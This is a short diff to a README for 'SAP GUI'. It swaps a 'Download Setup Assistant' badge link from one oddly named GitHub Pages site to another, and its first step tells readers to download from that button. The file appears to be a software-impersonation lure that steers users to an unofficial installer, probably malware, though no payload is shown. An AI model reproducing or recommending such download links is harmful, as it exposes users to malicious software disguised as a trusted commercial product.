@@ -1,6 +1,6 @@
 # SAP GUI 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/sapgui)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://sap-gui-downloadguide.github.io/.github/)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
